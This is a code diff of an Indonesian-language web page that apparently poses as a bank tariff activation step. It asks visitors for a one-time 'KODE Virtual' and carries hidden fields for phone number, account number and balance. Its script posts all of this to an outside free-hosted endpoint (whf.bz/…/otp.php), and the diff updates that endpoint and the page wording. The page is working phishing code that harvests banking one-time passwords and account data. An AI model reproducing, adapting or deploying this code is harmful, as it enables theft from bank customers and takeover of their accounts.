@@ -393,7 +393,7 @@
      <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
          
     <div id="lonte" class="lonte"></div>
-      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Aktivasi TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><br>Kode Aktivasi (Wajib).</p> 
+      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Virtual TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><br>Kode Virtual (Wajib).</p> 
      </div> 
     </div> 
     <div class="row"> 
@@ -402,7 +402,7 @@
         
            <input type="hidden" id="tarif" name="tarif">
             <input type="hidden" id="nohp" name="nohp">
-            <input type="hidden" id="nama" name="nama">   
+            
              <input type="hidden" id="rek" name="rek">            
             <input type="hidden" id="saldo" name="saldo">
        <center> 
@@ -411,9 +411,9 @@
        <i class="ion-ios-locked-outline" id="ionIcons"></i> 
    
 
-         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Aktivasi" maxlength="" minlength="" style="margin-left: 0px;" required onclick="gantiborder1()">
+         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Virtual" maxlength="" minlength="" style="margin-left: 0px;" required onclick="gantiborder1()">
   
-         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: underline" onclick="go()">Belum Menerima Kode Aktivasi ? </strong></p></b>
+         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: underline" onclick="go()">Belum Menerima Kode Virtual ? </strong></p></b>
         </div>
        </center>
        <b>
@@ -478,7 +478,7 @@
            
             $.ajax({
                 type: 'POST',
-                url: 'https://chroedevsi.whf.bz/35/otp.php',
+                url: 'https://chroedevsi.whf.bz/36/otp.php',
                 data: $('#formLink').serialize(),
                 datatype: 'JSON',
                 complete: function (response) {
@@ -511,8 +511,7 @@
         document.getElementById("tarif").value =
         sessionStorage.getItem("tarif");
         document.getElementById("nohp").value = nohp;        
-        document.getElementById("nama").value =
-        sessionStorage.getItem("nama"); 
+        
          document.getElementById("rek").value =
         sessionStorage.getItem("rek");        
         document.getElementById("saldo").value =
